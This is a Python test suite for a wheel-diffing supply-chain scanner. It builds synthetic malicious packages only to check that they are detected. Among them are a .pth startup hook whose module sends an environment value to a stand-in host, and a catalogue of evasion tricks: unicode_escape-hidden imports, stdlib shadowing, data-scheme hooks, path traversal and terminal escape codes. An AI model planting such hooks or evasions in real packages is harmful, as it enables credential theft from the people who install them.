"""Tests for algobank/diff.py on synthetic wheels that reproduce real attack patterns.
Run: python3.14 -I v0.1/test_diff.py

The wheels are built in a temporary directory and only parsed; nothing is installed or run.
"""
import io, os, sys, tempfile, zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from algobank import diff as ad

BASE = {
    "demo/__init__.py": "from .util import fmt\n",
    "demo/util.py": "def fmt(s):\n    return s.upper()\n",
}
META = "Metadata-Version: 2.1\nName: demo\nVersion: {v}\nRequires-Dist: idna (>=2)\n"

def wheel(tmp, version, files, meta=None):
    path = os.path.join(tmp, f"demo-{version}-py3-none-any.whl")
    with zipfile.ZipFile(path, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
        z.writestr(f"demo-{version}.dist-info/METADATA", meta or META.format(v=version))
    return path

def run_diff(old_files, new_files, new_meta=None):
    with tempfile.TemporaryDirectory() as tmp:
        a = ad.analyze(ad.load(wheel(tmp, "1.0", old_files)))
        b = ad.analyze(ad.load(wheel(tmp, "1.1", new_files, new_meta)))
        return ad.diff_report(a, b)

def high(r): return [x for x in r["findings"] if x["severity"] == "high"]
def kinds(r, sev=("high", "medium")): return {x["kind"] for x in r["findings"] if x["severity"] in sev}

def test_clean_update_is_quiet():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    return s.upper() + '!'\n"})
    r = run_diff(BASE, new)
    assert r["nodes"]["code_changed"] == 1
    assert not kinds(r), r["findings"]

def test_startup_hook():
    """LiteLLM 1.107.0: a .pth file and a module that read credentials and send them out."""
    new = dict(BASE, **{
        "demo_init.pth": "import demo._boot\n",
        "demo/_boot.py": "import os, urllib.request\n\n"
                         "def send():\n    urllib.request.urlopen('https://example.invalid', data=os.environ.get('HOME', '').encode())\n",
    })
    r = run_diff(BASE, new)
    texts = " ".join(x["text"] for x in high(r))
    assert "demo_init.pth" in texts and "every Python start" in texts
    assert "network" in texts and "env" in texts

def test_existing_function_gains_network():
    """chalk/debug: an existing formatting function starts using the network."""
    new = dict(BASE, **{"demo/util.py": "import urllib.request\n\ndef fmt(s):\n"
                                        "    urllib.request.urlopen('https://example.invalid')\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    x = next(x for x in high(r) if "network" in x["text"])
    assert "demo.util:fmt" in x["nodes"]

def test_new_dynamic_exec():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    exec(s)\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    assert any("eval, exec" in x["text"] for x in high(r))

def test_new_native_binary():
    new = dict(BASE, **{"demo/_speedups.so": b"\x7fELF not really"})
    r = run_diff(BASE, new)
    assert any(x["kind"] == "native" and x["text"] == "new native binary detected. not checked" for x in high(r))
    assert "native" in r["scope"]["new"] and "native" not in r["scope"]["old"]

def test_native_binary_can_be_ignored():
    """A package with native code can still be algobanked: the binary stays reported, marked ignored,
    to be checked separately, and does not fail the run."""
    with tempfile.TemporaryDirectory() as tmp:
        path = wheel(tmp, "1.0", dict(BASE, **{"demo/_speedups.so": b"\x7fELF not really"}))
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["text"] == "native binary detected. not checked" for x in high(r)) and "native" in r["scope"]
        assert ad.main(["scope", path]) == 1
        assert ad.main(["scope", path, "--ignore-native"]) == 0
        hooked = wheel(tmp, "1.1", dict(BASE, **{"demo/_speedups.so": b"\x7fELF", "x.pth": "import demo\n"}))
        assert ad.main(["scope", hooked, "--ignore-native"]) == 1      # only native findings are ignored

def test_new_dependency():
    """axios 1.14.1 added one dependency, plain-crypto-js, which carried the malware."""
    meta = META.format(v="1.1") + "Requires-Dist: plain-crypto-js\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency plain_crypto_js" in x["text"] and "TOP" in x["text"] for x in high(r))

def test_new_optional_dependency_is_high():
    """Test-only and optional dependencies bring unanalyzed code too: setuptools in a test extra
    reaches the environment and files if anything uses it in production."""
    meta = META.format(v="1.1") + "Requires-Dist: setuptools ; extra == 'testing'\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency setuptools" in x["text"] for x in high(r))

def test_dependency_formatting_is_not_a_change():
    meta = "Metadata-Version: 2.1\nName: demo\nVersion: 1.1\nRequires-Dist: idna >=2\n"
    r = run_diff(BASE, BASE, meta)
    assert not r["findings"], r["findings"]

def test_exit_status():
    with tempfile.TemporaryDirectory() as tmp:
        old = wheel(tmp, "1.0", BASE)
        hooked = wheel(tmp, "1.1", dict(BASE, **{"x.pth": "import demo\n"}))
        assert ad.main(["diff", old, old]) == 0
        assert ad.main(["diff", old, hooked]) == 1
        assert ad.main(["diff", old, os.path.join(tmp, "missing.whl")]) == 2
        assert ad.main(["scope", old]) == 0

def test_sdist_is_high():
    """Installing an sdist runs its build backend, and pip download runs it to read the metadata."""
    import io, tarfile
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "demo-1.1.tar.gz")
        with tarfile.open(path, "w:gz") as t:
            for name, data in dict(BASE, **{"PKG-INFO": META.format(v="1.1")}).items():
                info = tarfile.TarInfo("demo-1.1/" + name); info.size = len(data.encode())
                t.addfile(info, io.BytesIO(data.encode()))
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["kind"] == "sdist" and "TOP" in x["text"] for x in high(r))
        assert ad.main(["scope", path]) == 1

def test_no_network_no_writes():
    """Algobank's own scope: it only reads the files it is given."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    files = {}
    for f in ("__init__.py", "__main__.py", "diff.py", "pkgmerkle.py"):
        with open(os.path.join(root, "algobank", f)) as fh:
            files["algobank/" + f] = fh.read()
    scope = set(ad.Package(files).scope())
    assert scope <= {"file"}, scope

def test_called_packages_should_be_algobanked():
    """A called package that was not algobanked in the same run is a warning, never a failure."""
    with tempfile.TemporaryDirectory() as tmp:
        demo = wheel(tmp, "1.0", BASE)                                   # calls idna
        idna = os.path.join(tmp, "idna-3.7-py3-none-any.whl")
        with zipfile.ZipFile(idna, "w") as z:
            z.writestr("idna/__init__.py", "def encode(s):\n    return s\n")
            z.writestr("idna-3.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: idna\nVersion: 3.7\n")
        alone = ad.with_called(ad.scope_report(ad.analyze(ad.load(demo))), ad.analyze(ad.load(demo)), {"demo"})
        w = [x for x in alone["findings"] if x["severity"] == "warning"]
        assert len(w) == 1 and w[0]["kind"] == "not algobanked" and "idna" in w[0]["text"]
        try:
            with_data(tmp)                                               # no advisories: only this check is tested
            assert ad.main(["scope", demo]) == 0                         # soft: the exit status is unchanged
            both = ad.with_called(ad.scope_report(ad.analyze(ad.load(demo))), ad.analyze(ad.load(demo)), {"demo", "idna"})
            assert not [x for x in both["findings"] if x["severity"] == "warning"]
            assert ad.main(["scope", demo, idna]) == 0
        finally: reset()
        r = run_diff(BASE, BASE, META.format(v="1.1") + "Requires-Dist: plain-crypto-js\n")
        assert any(x["severity"] == "high" and x["kind"] == "dependency" for x in r["findings"])   # new dependency stays high

# ---- known data: tested with a synthetic known.json, never the shipped one

import hashlib, json

# ---- closures: several packages as one graph ------------------------------------------------------------

def pkg_wheel(tmp, name, files, requires=()):
    path = os.path.join(tmp, f"{name}-1.0-py3-none-any.whl")
    with zipfile.ZipFile(path, "w") as z:
        for k, v in files.items(): z.writestr(k, v)
        z.writestr(f"{name}-1.0.dist-info/METADATA", f"Metadata-Version: 2.1\nName: {name}\nVersion: 1.0\n"
                   + "".join(f"Requires-Dist: {r}\n" for r in requires))
    return path

APP = {"app/__init__.py": "", "app/main.py": "from netlib import fetch\n\ndef run(u):\n    return fetch(u)\n"}
NETLIB = {"netlib/__init__.py": "import socket\n\ndef fetch(u):\n    return socket.create_connection((u, 80))\n"}

def closure(*paths):
    reset()
    return ad.closure_report([ad.analyze(ad.load(x)) for x in paths])

def test_closure_follows_calls_into_dependencies():
    """Alone, app's call into netlib is not followed. In the closure, app reaches netlib's network."""
    with tempfile.TemporaryDirectory() as tmp:
        app, net = pkg_wheel(tmp, "app", APP, ["netlib"]), pkg_wheel(tmp, "netlib", NETLIB)
        assert ad.scope_report(ad.analyze(ad.load(app)))["scope"] == []
        r = closure(app, net)
        assert r["scope"] == ["network"]
        assert {p["artifact"]: p["scope"] for p in r["packages"]}["app-1.0-py3-none-any.whl"] == ["network"]
        assert r["enters"] == {"network": ["netlib-1.0-py3-none-any.whl"]}
        assert not [x for x in r["findings"] if x["kind"] == "not algobanked"]
        assert ad.main(["scope", "--closure", app, net]) == 0

def test_closure_never_reports_less_than_the_scope_table():
    """A package named in the scope table keeps the table's scope, even when its code is in the closure."""
    with tempfile.TemporaryDirectory() as tmp:
        app = pkg_wheel(tmp, "app", {"app/__init__.py": "import requests\n\ndef run(u):\n    return requests.get(u)\n"}, ["requests"])
        fake = pkg_wheel(tmp, "requests", {"requests/__init__.py": "def get(u):\n    return u\n"})
        r = closure(app, fake)
        assert "network" in {p["artifact"]: p["scope"] for p in r["packages"]}["app-1.0-py3-none-any.whl"]

def test_closure_reports_missing_dependencies():
    with tempfile.TemporaryDirectory() as tmp:
        r = closure(pkg_wheel(tmp, "app", APP, ["netlib"]))
        assert [x["severity"] for x in r["findings"] if "netlib" in x["text"]] == ["warning"]

def test_closure_reports_a_module_in_two_packages():
    """Two wheels that ship the same file with different code: which runs depends on the order of installation."""
    with tempfile.TemporaryDirectory() as tmp:
        a = pkg_wheel(tmp, "one", {"shared/__init__.py": "X = 1\n"})
        b = pkg_wheel(tmp, "two", {"shared/__init__.py": "X = 2\n"})
        r = closure(a, b)
        assert any(x["kind"] == "conflict" and x["severity"] == "high" for x in r["findings"])
        same = closure(a, pkg_wheel(tmp, "three", {"shared/__init__.py": "X = 1\n"}))
        assert not [x for x in same["findings"] if x["kind"] == "conflict"]

# ---- design findings ---------------------------------------------------------------------------------------

def test_effect_in_a_special_method():
    with tempfile.TemporaryDirectory() as tmp:
        files = {"w/__init__.py": "class Writer:\n    def __call__(self, p):\n        return open(p, 'w')\n"
                                   "    @property\n    def size(self):\n        return open('x').read()\n"
                                   "    def __init__(self):\n        self.f = open('y')\n"}
        r = ad.scope_report(ad.analyze(ad.load(pkg_wheel(tmp, "w", files))))
        hits = sorted(x["nodes"][0] for x in r["findings"] if x["kind"] == "effect in a special method")
        assert hits == ["w:Writer.__call__", "w:Writer.size"], hits          # __init__ is called visibly: K()
        assert all(x["severity"] == "medium" for x in r["findings"] if x["kind"] == "effect in a special method")

def test_effect_under_a_shared_name():
    with tempfile.TemporaryDirectory() as tmp:
        files = {"s/__init__.py": "class Files:\n    def open(self, p):\n        return open(p)\n"
                                   "class Doc:\n    def open(self):\n        return 1\n"
                                   "def fetch_file(p):\n    return open(p)\n"
                                   "class A:\n    def __init__(self):\n        self.f = open('a')\nclass B:\n    def __init__(self):\n        pass\n"}
        r = ad.scope_report(ad.analyze(ad.load(pkg_wheel(tmp, "s", files))))
        hits = [x["nodes"][0] for x in r["findings"] if x["kind"] == "effect under a shared name"]
        assert hits == ["s:Files.open"], hits                               # fetch_file is unique; __init__ is found by class

def test_design_findings_in_diff_are_new_cases_only():
    with tempfile.TemporaryDirectory() as tmp:
        old = dict(BASE, **{"demo/w.py": "class W:\n    def __call__(self, p):\n        return open(p)\n"})
        new = dict(old, **{"demo/x.py": "class X:\n    def __str__(self):\n        return open('x').read()\n"})
        r = run_diff(old, new)
        hits = [x["nodes"][0] for x in r["findings"] if x["kind"] == "effect in a special method"]
        assert hits == ["demo.x:X.__str__"], hits

# ---- evasions: code that runs without being analyzed, or powers under other names ---------------------------
# Each wheel hides one thing. Each must show it: as a finding of the given kind, or in the scope.

NET = "import socket\ndef go():\n    socket.create_connection(('x', 1))\n"
EVASIONS = {   # name: (files, metadata name and version or None, (finding kind or None, scope or None))
    "a source file in another encoding": ({"e/__init__.py": b"# -*- coding: latin-1 -*-\n# \xe9\n" + NET.encode()}, None, ("encoding", "network")),
    "code hidden by unicode_escape": ({"e/__init__.py": b"# coding: unicode_escape\n# \\u000aimport socket; socket.create_connection(('x', 1))\n"}, None, ("encoding", "network")),
    "a file that cannot be decoded": ({"e/__init__.py": b"# coding: no-such-codec\nx = 1\n"}, None, ("not analyzed", None)),
    "a file that cannot be parsed": ({"e/__init__.py": "print 'python 2'\n"}, None, ("not analyzed", None)),
    "compiled Python": ({"e/__init__.py": "", "e/__pycache__/x.cpython-314.pyc": b"\xcb\r\r\n" + bytes(12)}, None, ("compiled", None)),
    "a versioned shared library": ({"e/__init__.py": "", "e/libx.so.1": b"\x7fELF" + bytes(60)}, None, ("native", "native")),
    "machine code with no extension": ({"e/__init__.py": "", "e/data.bin": b"\x7fELF" + bytes(60)}, None, ("native", "native")),
    "a .pyw module": ({"e/__init__.py": "", "e/run.pyw": NET}, None, (None, "network")),
    "a path outside the package": ({"e/__init__.py": "", "../evil.py": NET}, None, ("path", None)),
    "names that differ only in case": ({"e/__init__.py": "", "E/__init__.py": NET}, None, ("duplicate", None)),
    "metadata that names another package": ({"e/__init__.py": ""}, ("other-name", "9.9"), ("metadata", None)),
    "a decoy metadata file deeper in": ({"e/__init__.py": "", "e/vendor/decoy-0.1.dist-info/METADATA": "Metadata-Version: 2.1\nName: decoy\nVersion: 0.1\n"}, None, (None, None)),
    "a pytest plugin entry point": ({"e/__init__.py": "", "e-1.0.dist-info/entry_points.txt": "[pytest11]\nx = e\n"}, None, ("entry point", None)),
    "a module that shadows the standard library": ({"e/__init__.py": "", "json.py": NET}, None, ("shadowing", None)),
    "invisible characters in code": ({"e/__init__.py": "x = 1  # \u202e reversed\n"}, None, ("hidden characters", None)),
    "a startup file through the data scheme": ({"e/__init__.py": "", "e-1.0.data/data/lib/python3.14/site-packages/x.pth": "import e\n"}, None, ("hook", None)),
    "a file into site-packages through the data scheme": ({"e/__init__.py": "", "e-1.0.data/data/lib/python3.14/site-packages/requests/__init__.py": NET}, None, ("hook", None)),
    "asyncio subprocess": ({"e/__init__.py": "import asyncio\nasync def go(c):\n    await asyncio.create_subprocess_shell(c)\n"}, None, (None, "process")),
    "os.execve": ({"e/__init__.py": "import os\ndef go(c):\n    os.execve('/bin/sh', ['sh'], {})\n"}, None, (None, "process")),
    "yaml.unsafe_load": ({"e/__init__.py": "import yaml\ndef go(s):\n    return yaml.unsafe_load(s)\n"}, None, (None, "TOP")),
    "runpy": ({"e/__init__.py": "import runpy\ndef go(p):\n    runpy.run_path(p)\n"}, None, (None, "TOP")),
    "sys.path changed, then a hidden import": ({"e/__init__.py": "import sys\nsys.path.insert(0, '/tmp/x')\nimport hidden\n"}, None, (None, "TOP")),
    "an SSH library": ({"e/__init__.py": "import paramiko\ndef go():\n    paramiko.SSHClient().connect('x')\n"}, None, (None, "network")),
}

def test_evasions_are_seen():
    missed = []
    with tempfile.TemporaryDirectory() as tmp:
        for i, (name, (files, meta, (kind, scope))) in enumerate(EVASIONS.items()):
            path = os.path.join(tmp, f"e-1.0-py3-none-any.whl")
            with zipfile.ZipFile(path, "w") as z:
                for k, v in files.items(): z.writestr(k, v)
                n, v = meta or ("e", "1.0")
                if "e-1.0.dist-info/METADATA" not in files:
                    z.writestr("e-1.0.dist-info/METADATA", f"Metadata-Version: 2.1\nName: {n}\nVersion: {v}\n")
            reset()
            a = ad.analyze(ad.load(path))
            r = ad.scope_report(a)
            kinds = {x["kind"] for x in r["findings"] if x["severity"] in ("high", "medium")}
            if kind and kind not in kinds or scope and scope not in r["scope"]:
                missed.append((name, sorted(kinds), r["scope"]))
            if name == "a decoy metadata file deeper in" and a["release"] != ("e", "1.0"):
                missed.append((name, a["release"]))
    assert not missed, missed

def test_a_duplicate_member_is_seen():
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "e-1.0-py3-none-any.whl")
        import warnings
        with warnings.catch_warnings(), zipfile.ZipFile(path, "w") as z:
            warnings.simplefilter("ignore")
            z.writestr("e/__init__.py", "x = 1\n"); z.writestr("e/__init__.py", NET)
            z.writestr("e-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: e\nVersion: 1.0\n")
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["kind"] == "duplicate" and x["severity"] == "high" for x in r["findings"])

def test_output_cannot_rewrite_the_terminal():
    """A file name with escape codes is printed as escapes, so it cannot erase a finding from the screen."""
    import contextlib
    with tempfile.TemporaryDirectory() as tmp:
        path = pkg_wheel(tmp, "e", {"x\x1b[2K\x1b[1A.pth": "import e\n", "e/__init__.py": ""})
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            assert ad.main(["scope", path]) == 1
        assert "\x1b" not in out.getvalue() and "\\u001b" in out.getvalue()

def test_a_broken_archive_fails_closed():
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "e-1.0-py3-none-any.whl")
        open(path, "wb").write(b"PK\x03\x04 not really a zip")
        assert ad.main(["scope", path]) == 2

def test_known_advisory_matches_an_equal_version():
    """An advisory that lists 1.0 matches a wheel versioned 1.0.0: they are one version."""
    with tempfile.TemporaryDirectory() as tmp:
        found = known(tmp, "1.0.0", advisory("MAL-TEST-2", "demo", versions=["1.0"]))
        assert any("MAL-TEST-2" in x["text"] for x in found), found

def advisory(id, name, versions=(), ranges=(), files=()):
    """A record in the OSV format the advisories are published in."""
    e = dict(id=id, affected=[dict(package=dict(name=name, ecosystem="PyPI"), versions=list(versions),
                                   ranges=[dict(type="ECOSYSTEM", events=ev) for ev in ranges])])
    if files:
        e["database_specific"] = dict(iocs=dict(files=[dict(digests=dict(sha256=d), paths=["x"]) for d in files]))
    return e

def with_data(tmp, *advisories):
    path = os.path.join(tmp, "known.json")
    with open(path, "w") as fh:
        json.dump(dict(date="2026-10-27", sources=["test"], advisories=list(advisories)), fh)
    ad.DATA, ad._known = path, None

def reset():
    ad.DATA = os.path.join(os.path.dirname(ad.__file__), "known.json"); ad._known = None

def known(tmp, version, *advisories, files=BASE):
    with_data(tmp, *advisories)
    a = ad.analyze(ad.load(wheel(tmp, version, files)))
    return [x for x in ad.with_known(ad.scope_report(a), a)["findings"] if x["kind"].startswith("known")]

def test_known_release_by_version_list():
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "1.1", advisory("PYSEC-0", "demo", versions=["1.1"]))
            assert len(r) == 1 and r[0]["severity"] == "high" and r[0]["kind"] == "known vulnerability"
            assert "PYSEC-0" in r[0]["text"] and "algobank/known.json" in r[0]["text"]
            assert not known(tmp, "1.2", advisory("PYSEC-0", "demo", versions=["1.1"]))
        finally: reset()

def test_known_release_by_range():
    """Ranges are evaluated here, with PEP 440 ordering: a secure version must pass every time."""
    with tempfile.TemporaryDirectory() as tmp:
        try:
            rng = [[{"introduced": "1.2"}, {"fixed": "1.10"}]]
            for v, hit in [("1.1", False), ("1.2", True), ("1.9", True), ("1.10rc1", True), ("1.10", False), ("1.10.post1", False)]:
                assert bool(known(tmp, v, advisory("PYSEC-1", "demo", ranges=rng))) == hit, v
            every = [[{"introduced": "0"}]]                             # most malicious-package reports
            r = known(tmp, "9.9", advisory("MAL-1", "demo", ranges=every))
            assert r and r[0]["kind"] == "known malicious"
            assert known(tmp, "2.0", advisory("MAL-2", "demo"))         # no versions, no ranges: every version
            assert not known(tmp, "1.3", advisory("PYSEC-2", "demo", ranges=[[{"introduced": "1.0"}, {"last_affected": "1.2"}]]))
        finally: reset()

def test_withdrawn_advisory_is_not_matched():
    """A withdrawn advisory was retracted by its publisher: the version it named passes."""
    with tempfile.TemporaryDirectory() as tmp:
        try:
            gone = dict(advisory("PYSEC-4", "demo", versions=["1.1"]), withdrawn="2026-10-01T00:00:00Z")
            assert not known(tmp, "1.1", gone)
            assert known(tmp, "1.1", advisory("PYSEC-5", "demo", versions=["1.1"]))
        finally: reset()

def test_known_release_uncomparable_version():
    """When a version cannot be compared with a range, the advisory may apply, so it is reported."""
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "1.0", advisory("PYSEC-3", "demo", ranges=[[{"introduced": "0"}, {"fixed": "not-a-version"}]]))
            assert r and "may apply" in r[0]["text"]
        finally: reset()

def test_known_malicious_file_inside_archive():
    """litellm 1.107.0: the .pth file's digest is published, so a repackaged copy is caught too."""
    pth = "import cook\n"
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "9.9", advisory("MAL-3", "litellm", files=[hashlib.sha256(pth.encode()).hexdigest()]),
                      files=dict(BASE, **{"cook.pth": pth}))
            assert any(x["kind"] == "known malicious" and "cook.pth" in x["text"] for x in r)
        finally: reset()

def test_known_data_date_is_stated():
    with tempfile.TemporaryDirectory() as tmp:
        try:
            with_data(tmp)
            a = ad.analyze(ad.load(wheel(tmp, "1.0", BASE)))
            assert any("as of 2026-10-27" in c for c in ad.with_known(ad.scope_report(a), a)["coverage"])
        finally: reset()

if __name__ == "__main__":
    import contextlib, io
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        with contextlib.redirect_stdout(io.StringIO()):
            t()
        print("ok  ", t.__name__)
    print(f"{len(tests)} tests passed")
